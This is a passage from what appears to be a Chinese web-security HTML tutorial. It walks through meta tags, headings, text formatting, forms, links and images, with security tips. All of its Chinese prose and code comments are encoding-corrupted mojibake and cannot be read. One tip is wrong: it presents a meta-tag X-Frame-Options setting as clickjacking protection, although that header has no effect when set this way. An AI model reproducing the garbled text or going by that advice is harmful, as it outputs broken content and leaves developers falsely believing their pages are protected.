é¡µé¢å†…å®¹å°†æ”¾ç½®åœ¨è¿™é‡Œ --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>å…³é”®ç‚¹è§£æï¼š</strong></p>
<ul>
<li><code>&lt;!DOCTYPE html&gt;</code>ï¼šå£°æ˜æ–‡æ¡£ç±»å‹ä¸ºHTML5ï¼Œç¡®ä¿æµè§ˆå™¨ä»¥æ ‡å‡†æ¨¡å¼æ¸²æŸ“é¡µé¢</li>
<li><code>&lt;html lang=&quot;zh-CN&quot;&gt;</code>ï¼šæ ¹å…ƒç´ ï¼Œ<code>lang</code>å±æ€§æŒ‡å®šé¡µé¢è¯­è¨€ä¸ºä¸­æ–‡</li>
<li><code>&lt;meta charset=&quot;UTF-8&quot;&gt;</code>ï¼šè®¾ç½®å­—ç¬¦ç¼–ç ä¸ºUTF-8ï¼Œç¡®ä¿ä¸­æ–‡ç­‰ç‰¹æ®Šå­—ç¬¦æ­£å¸¸æ˜¾ç¤º</li>
<li><code>&lt;title&gt;</code>ï¼šå®šä¹‰æµè§ˆå™¨æ ‡ç­¾é¡µæ˜¾ç¤ºçš„æ ‡é¢˜</li>
<li><code>&lt;body&gt;</code>ï¼šåŒ…å«æ‰€æœ‰é¡µé¢å¯è§å†…å®¹çš„å®¹å™¨</li>
</ul>
<p><strong>å®‰å…¨æç¤º</strong>ï¼šUTF-8ç¼–ç æ˜¯å®‰å…¨é¦–é€‰ï¼Œé¿å…ä½¿ç”¨GBKç­‰ç¼–ç ï¼Œé˜²æ­¢ç¼–ç è½¬æ¢å¯¼è‡´çš„XSSæ¼æ´ã€‚</p>
<h2 id="2-HTMLå¸¸è§æ ‡ç­¾è¯¦è§£"><a href="#2-HTMLå¸¸è§æ ‡ç­¾è¯¦è§£" class="headerlink" title="2. HTMLå¸¸è§æ ‡ç­¾è¯¦è§£"></a>2. HTMLå¸¸è§æ ‡ç­¾è¯¦è§£</h2><h3 id="2-1-metaæ ‡ç­¾"><a href="#2-1-metaæ ‡ç­¾" class="headerlink" title="2.1 metaæ ‡ç­¾"></a>2.1 metaæ ‡ç­¾</h3><p><code>&lt;meta&gt;</code> å…ƒç´ ç”¨äºæä¾›å…³äºHTMLæ–‡æ¡£çš„å…ƒæ•°æ®ï¼Œå¯¹SEOå’Œå®‰å…¨é…ç½®è‡³å…³é‡è¦ã€‚</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;zh-CN&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- å­—ç¬¦ç¼–ç  --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">&lt;!-- é¡µé¢æè¿°ï¼ˆSEOä¼˜åŒ–ï¼‰ --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;description&quot;</span> <span class="attr">content</span>=<span class="string">&quot;WEBå®‰å…¨HTMLåŸºç¡€æ•™ç¨‹ - å®‰å…¨æ¸—é€å¿…å¤‡æŠ€èƒ½&quot;</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">&lt;!-- å…³é”®è¯ï¼ˆç°ä»£æœç´¢å¼•æ“å·²ä¸ä¾èµ–ï¼Œä½†éƒ¨åˆ†åœºæ™¯ä»æœ‰ç”¨ï¼‰ --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;keywords&quot;</span> <span class="attr">content</span>=<span class="string">&quot;ç½‘ç»œå®‰å…¨, WEBæ¸—é€, æ•°æ®å®‰å…¨, æ¸—é€æµ‹è¯•, å®‰å…¨åŸ¹è®­&quot;</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">&lt;!-- ä½œè€…ä¿¡æ¯ --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;author&quot;</span> <span class="attr">content</span>=<span class="string">&quot;moonsec&quot;</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">&lt;!-- ç§»åŠ¨è®¾å¤‡é€‚é… --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">&lt;!-- å†…å®¹å®‰å…¨ç­–ç•¥ï¼ˆCSPï¼‰- é‡è¦å®‰å…¨é…ç½® --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Security-Policy&quot;</span> </span></span><br><span class="line"><span class="tag">          <span class="attr">content</span>=<span class="string">&quot;default-src &#x27;self&#x27;; script-src &#x27;self&#x27; https://trusted.cdn.com; style-src &#x27;self&#x27; &#x27;unsafe-inline&#x27;&quot;</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">&lt;!-- X-Frame-Options - é˜²æ­¢ç‚¹å‡»åŠ«æŒ --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-Frame-Options&quot;</span> <span class="attr">content</span>=<span class="string">&quot;DENY&quot;</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">&lt;!-- åˆ·æ–°é¡µé¢ï¼ˆ5ç§’åè·³è½¬ï¼‰ --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;refresh&quot;</span> <span class="attr">content</span>=<span class="string">&quot;5;url=https://www.example.com&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>å®‰å…¨è¯´æ˜ï¼š</strong></p>
<ul>
<li><code>Content-Security-Policy</code> æ˜¯é˜²å¾¡XSSæ”»å‡»çš„é‡è¦æ‰‹æ®µï¼Œé™åˆ¶å¯æ‰§è¡Œçš„è„šæœ¬æ¥æº</li>
<li><code>X-Frame-Options: DENY</code> é˜²æ­¢é¡µé¢è¢«åµŒå…¥åˆ°iframeä¸­ï¼Œé¿å…ç‚¹å‡»åŠ«æŒæ”»å‡»</li>
<li><code>charset=UTF-8</code> æ˜¯å®‰å…¨åŸºç¡€ï¼Œé¿å…ç¼–ç è½¬æ¢æ¼æ´</li>
</ul>
<h3 id="2-2-æ ‡é¢˜æ ‡ç­¾"><a href="#2-2-æ ‡é¢˜æ ‡ç­¾" class="headerlink" title="2.2 æ ‡é¢˜æ ‡ç­¾"></a>2.2 æ ‡é¢˜æ ‡ç­¾</h3><p>HTMLæä¾›6çº§æ ‡é¢˜æ ‡ç­¾ï¼Œä»<code>&lt;h1&gt;</code>åˆ°<code>&lt;h6&gt;</code>ï¼Œå…¶ä¸­<code>&lt;h1&gt;</code>çº§åˆ«æœ€é«˜ï¼Œ<code>&lt;h6&gt;</code>æœ€ä½ã€‚</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>WEBå®‰å…¨æ ¸å¿ƒçŸ¥è¯†<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>HTMLåŸºç¡€<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h3</span>&gt;</span>è¡¨å•å®‰å…¨<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h4</span>&gt;</span>å¸¸è§æ¼æ´ç±»å‹<span class="tag">&lt;/<span class="name">h4</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h5</span>&gt;</span>XSSæ”»å‡»åŸç†<span class="tag">&lt;/<span class="name">h5</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h6</span>&gt;</span>é˜²å¾¡æªæ–½<span class="tag">&lt;/<span class="name">h6</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- æ¢è¡Œæ ‡ç­¾ --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>è¿™æ˜¯ç¬¬ä¸€æ®µå†…å®¹<span class="tag">&lt;<span class="name">br</span>&gt;</span>æ¢è¡Œåçš„å†…å®¹<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- æ°´å¹³çº¿æ ‡ç­¾ --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>æ°´å¹³çº¿åˆ†å‰²å†…å®¹<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>æœ€ä½³å®è·µï¼š</strong></p>
<ul>
<li>ä¸€ä¸ªé¡µé¢é€šå¸¸åªæœ‰ä¸€ä¸ª<code>&lt;h1&gt;</code>ï¼Œç”¨äºä¸»æ ‡é¢˜</li>
<li>æ ‡é¢˜å±‚çº§åº”é€çº§ä¸‹é™ï¼Œä¸è¦è·³çº§ä½¿ç”¨ï¼ˆå¦‚ä¸è¦ä»<code>&lt;h1&gt;</code>ç›´æ¥åˆ°<code>&lt;h4&gt;</code>ï¼‰</li>
<li>åˆç†çš„æ ‡é¢˜ç»“æ„æœ‰åŠ©äºå±å¹•é˜…è¯»å™¨ç†è§£é¡µé¢ç»“æ„ï¼Œæå‡å¯è®¿é—®æ€§</li>
<li>æ¢è¡Œæ ‡ç­¾<code>&lt;br&gt;</code>åº”é¿å…è¿‡åº¦ä½¿ç”¨ï¼Œä¼˜å…ˆä½¿ç”¨CSSæ§åˆ¶å¸ƒå±€</li>
</ul>
<h3 id="2-3-æ–‡æœ¬å±æ€§"><a href="#2-3-æ–‡æœ¬å±æ€§" class="headerlink" title="2.3 æ–‡æœ¬å±æ€§"></a>2.3 æ–‡æœ¬å±æ€§</h3><p>å¸¸ç”¨æ–‡æœ¬æ ¼å¼åŒ–æ ‡ç­¾ï¼Œæ³¨æ„HTML5ä¸­å·²åºŸå¼ƒæŸäº›æ ‡ç­¾ï¼Œåº”ä½¿ç”¨CSSæ›¿ä»£ã€‚</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">strong</span>&gt;</span>åŠ ç²—æ–‡æœ¬ï¼ˆè¯­ä¹‰é‡è¦ï¼‰<span class="tag">&lt;/<span class="name">strong</span>&gt;</span> æˆ– <span class="tag">&lt;<span class="name">b</span>&gt;</span>åŠ ç²—æ–‡æœ¬ï¼ˆä»…è§†è§‰ï¼‰<span class="tag">&lt;/<span class="name">b</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">em</span>&gt;</span>æ–œä½“æ–‡æœ¬ï¼ˆè¯­ä¹‰å¼ºè°ƒï¼‰<span class="tag">&lt;/<span class="name">em</span>&gt;</span> æˆ– <span class="tag">&lt;<span class="name">i</span>&gt;</span>æ–œä½“æ–‡æœ¬ï¼ˆä»…è§†è§‰ï¼‰<span class="tag">&lt;/<span class="name">i</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">u</span>&gt;</span>ä¸‹åˆ’çº¿æ–‡æœ¬ï¼ˆè°¨æ…ä½¿ç”¨ï¼Œé€šå¸¸ç”¨äºé“¾æ¥ï¼‰<span class="tag">&lt;/<span class="name">u</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>æ•°å­¦å…¬å¼: X<span class="tag">&lt;<span class="name">sup</span>&gt;</span>2<span class="tag">&lt;/<span class="name">sup</span>&gt;</span> + H<span class="tag">&lt;<span class="name">sub</span>&gt;</span>2<span class="tag">&lt;/<span class="name">sub</span>&gt;</span>O<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">del</span>&gt;</span>å·²åˆ é™¤çš„å†…å®¹<span class="tag">&lt;/<span class="name">del</span>&gt;</span> <span class="tag">&lt;<span class="name">ins</span>&gt;</span>å·²æ·»åŠ çš„å†…å®¹<span class="tag">&lt;/<span class="name">ins</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">pre</span>&gt;</span></span><br><span class="line">    é¢„æ ¼å¼åŒ–æ–‡æœ¬ç¤ºä¾‹ï¼š</span><br><span class="line">      ä¿ç•™ç©ºæ ¼å’Œæ¢è¡Œ</span><br><span class="line">      function example() &#123;</span><br><span class="line">          console.log(&quot;Hello World&quot;);</span><br><span class="line">      &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">pre</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>å®‰å…¨æ³¨æ„äº‹é¡¹ï¼š</strong></p>
<ul>
<li><code>&lt;font&gt;</code> æ ‡ç­¾åœ¨HTML5ä¸­å·²è¢«åºŸå¼ƒï¼Œåº”ä½¿ç”¨CSSæ§åˆ¶å­—ä½“æ ·å¼</li>
<li><code>&lt;strong&gt;</code> å’Œ <code>&lt;em&gt;</code> å…·æœ‰è¯­ä¹‰å«ä¹‰ï¼Œè¡¨ç¤ºå†…å®¹çš„é‡è¦æ€§æˆ–å¼ºè°ƒï¼Œå¯¹SEOå’Œå¯è®¿é—®æ€§æœ‰å¸®åŠ©</li>
<li><code>&lt;del&gt;</code> å’Œ <code>&lt;ins&gt;</code> ç”¨äºè¡¨ç¤ºå†…å®¹çš„åˆ é™¤å’Œæ·»åŠ ï¼Œå¸¸ç”¨äºä¿®è®¢æ–‡æ¡£</li>
<li><code>&lt;pre&gt;</code> ä¿ç•™æ‰€æœ‰ç©ºæ ¼å’Œæ¢è¡Œï¼Œé€‚åˆå±•ç¤ºä»£ç ã€ASCIIè‰ºæœ¯ç­‰</li>
</ul>
<h3 id="2-4-formè¡¨å•"><a href="#2-4-formè¡¨å•" class="headerlink" title="2.4 formè¡¨å•"></a>2.4 formè¡¨å•</h3><p><code>&lt;form&gt;</code> ç”¨äºåˆ›å»ºç”¨æˆ·å¯æäº¤æ•°æ®çš„è¡¨å•ï¼Œæ˜¯Webäº¤äº’çš„æ ¸å¿ƒç»„ä»¶ï¼Œä¹Ÿæ˜¯å®‰å…¨æ¼æ´é«˜å‘åŒºã€‚</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;/submit&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;username&quot;</span>&gt;</span>ç”¨æˆ·å:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">id</span>=<span class="string">&quot;username&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;è¯·è¾“å…¥ç”¨æˆ·å&quot;</span> <span class="attr">required</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;password&quot;</span>&gt;</span>å¯†ç :<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">id</span>=<span class="string">&quot;password&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">minlength</span>=<span class="string">&quot;8&quot;</span> <span class="attr">required</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;file&quot;</span>&gt;</span>ä¸Šä¼ å¤´åƒ:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">id</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;avatar&quot;</span> <span class="attr">accept</span>=<span class="string">&quot;image/*&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;email&quot;</span>&gt;</span>é‚®ç®±:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;email&quot;</span> <span class="attr">id</span>=<span class="string">&quot;email&quot;</span> <span class="attr">name</span>=<span class="string">&quot;email&quot;</span> <span class="attr">required</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;color&quot;</span>&gt;</span>é€‰æ‹©é¢œè‰²:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;color&quot;</span> <span class="attr">id</span>=<span class="string">&quot;color&quot;</span> <span class="attr">name</span>=<span class="string">&quot;color&quot;</span> <span class="attr">value</span>=<span class="string">&quot;#ff0000&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;checkbox1&quot;</span>&gt;</span>é€‰é¡¹1<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">id</span>=<span class="string">&quot;checkbox1&quot;</span> <span class="attr">name</span>=<span class="string">&quot;option&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;checkbox2&quot;</span>&gt;</span>é€‰é¡¹2<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">id</span>=<span class="string">&quot;checkbox2&quot;</span> <span class="attr">name</span>=<span class="string">&quot;option&quot;</span> <span class="attr">value</span>=<span class="string">&quot;2&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;radio1&quot;</span>&gt;</span>é€‰é¡¹A<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">id</span>=<span class="string">&quot;radio1&quot;</span> <span class="attr">name</span>=<span class="string">&quot;group&quot;</span> <span class="attr">value</span>=<span class="string">&quot;A&quot;</span> <span class="attr">checked</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;radio2&quot;</span>&gt;</span>é€‰é¡¹B<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">id</span>=<span class="string">&quot;radio2&quot;</span> <span class="attr">name</span>=<span class="string">&quot;group&quot;</span> <span class="attr">value</span>=<span class="string">&quot;B&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;æäº¤&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;reset&quot;</span> <span class="attr">value</span>=<span class="string">&quot;é‡ç½®&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;csrf_token&quot;</span> <span class="attr">value</span>=<span class="string">&quot;abc123&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>å®‰å…¨å…³é”®ç‚¹ï¼š</strong></p>
<ul>
<li><code>method=&quot;post&quot;</code>ï¼šæ•°æ®é€šè¿‡HTTPè¯·æ±‚ä½“å‘é€ï¼Œé€‚åˆæ•æ„Ÿæ•°æ®ï¼ˆå¦‚ç™»å½•ï¼‰ï¼ŒGETæ–¹æ³•ä¼šå°†æ•°æ®æš´éœ²åœ¨URLä¸­</li>
<li><code>enctype=&quot;multipart/form-data&quot;</code>ï¼šæ–‡ä»¶ä¸Šä¼ æ—¶å¿…é¡»ä½¿ç”¨æ­¤ç¼–ç ç±»å‹</li>
<li><code>required</code>ï¼šå¿…å¡«å­—æ®µï¼Œæäº¤æ—¶ä¼šè‡ªåŠ¨éªŒè¯</li>
<li><code>placeholder</code>ï¼šè¾“å…¥æ¡†æç¤ºæ–‡æœ¬</li>
<li><code>accept=&quot;image/*&quot;</code>ï¼šé™åˆ¶æ–‡ä»¶ç±»å‹ä¸ºå›¾ç‰‡</li>
<li><code>minlength</code>ï¼šè®¾ç½®å¯†ç æœ€å°é•¿åº¦</li>
<li><code>hidden</code>ï¼šéšè—åŸŸï¼Œç”¨äºä¼ é€’ä¸å¯è§æ•°æ®ï¼ˆå¦‚CSRFä»¤ç‰Œï¼‰</li>
<li><strong>å®‰å…¨æç¤º</strong>ï¼šè¡¨å•åº”ä½¿ç”¨HTTPSä¼ è¾“ï¼Œå¯¹ç”¨æˆ·è¾“å…¥è¿›è¡Œä¸¥æ ¼éªŒè¯ï¼Œé˜²æ­¢XSSå’ŒSQLæ³¨å…¥æ”»å‡»</li>
</ul>
<h3 id="2-5-aæ ‡ç­¾ã€imgæ ‡ç­¾ã€tableæ ‡ç­¾"><a href="#2-5-aæ ‡ç­¾ã€imgæ ‡ç­¾ã€tableæ ‡ç­¾" class="headerlink" title="2.5 aæ ‡ç­¾ã€imgæ ‡ç­¾ã€tableæ ‡ç­¾"></a>2.5 aæ ‡ç­¾ã€imgæ ‡ç­¾ã€tableæ ‡ç­¾</h3><h4 id="aæ ‡ç­¾ï¼ˆè¶…é“¾æ¥ï¼‰"><a href="#aæ ‡ç­¾ï¼ˆè¶…é“¾æ¥ï¼‰" class="headerlink" title="aæ ‡ç­¾ï¼ˆè¶…é“¾æ¥ï¼‰"></a>aæ ‡ç­¾ï¼ˆè¶…é“¾æ¥ï¼‰</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- å¤–éƒ¨é“¾æ¥ï¼ˆæ–°çª—å£æ‰“å¼€ï¼‰ --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://www.baidu.com&quot;</span> <span class="attr">target</span>=<span class="string">&quot;_blank&quot;</span> <span class="attr">rel</span>=<span class="string">&quot;noopener noreferrer&quot;</span>&gt;</span>ç™¾åº¦ï¼ˆæ–°çª—å£æ‰“å¼€ï¼‰<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- é”šç‚¹è·³è½¬ --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#section1&quot;</span>&gt;</span>è·³è½¬åˆ°ç« èŠ‚1<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#section2&quot;</span>&gt;</span>è·³è½¬åˆ°ç« èŠ‚2<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- é”šç‚¹å®šä¹‰ --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span> <span class="attr">id</span>=<span class="string">&quot;section1&quot;</span>&gt;</span>ç« èŠ‚1<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span> <span class="attr">id</span>=<span class="string">&quot;section2&quot;</span>&gt;</span>ç« èŠ‚2<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- é‚®ç®±é“¾æ¥ --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;mailto:example@example.com&quot;</span>&gt;</span>å‘é€é‚®ä»¶<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- ç”µè¯é“¾æ¥ --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;tel:+8613800138000&quot;</span>&gt;</span>æ‹¨æ‰“ç”µè¯<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>å®‰å…¨æ³¨æ„äº‹é¡¹ï¼š</strong></p>
<ul>
<li><code>rel=&quot;noopener noreferrer&quot;</code> æ˜¯å¿…é¡»çš„ï¼Œé˜²æ­¢æ–°æ‰“å¼€çš„é¡µé¢é€šè¿‡<code>window.opener</code>è®¿é—®åŸé¡µé¢</li>
<li>é¿å…ç›´æ¥ä½¿ç”¨<code>target=&quot;_blank&quot;</code>è€Œä¸åŠ <code>rel</code>å±æ€§ï¼Œå­˜åœ¨å®‰å…¨é£é™©</li>
<li>é”šç‚¹è·³è½¬åº”ä½¿ç”¨<code>id</code>å±æ€§ï¼Œè€Œé<code>name</code>å±æ€§</li>
</ul>
<h4 id="imgæ ‡ç­¾ï¼ˆå›¾åƒï¼‰"><a href="#imgæ ‡ç­¾ï¼ˆå›¾åƒï¼‰" class="headerlink" title="imgæ ‡ç­¾ï¼ˆå›¾åƒï¼‰"></a>imgæ ‡ç­¾ï¼ˆå›¾åƒï¼‰</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;logo.png&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;ç½‘ç«™Logo&quot;</span> <span class="attr">width</span>=<span class="string">&quot;200&quot;</span> <span class="attr">height</span>=<span class="string">&quot;100&quot;</span> <span class="attr">loading</span>=<span class="string">&quot;lazy&quot;</span> <span class="attr">style</span>=<span class="string">&quot;border: 1px solid #ccc;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>å…³é”®å±æ€§ï¼š</strong></p>
<ul>
<li><code>src</code>ï¼šå›¾åƒURLï¼ˆå¿…é¡»ï¼‰</li>
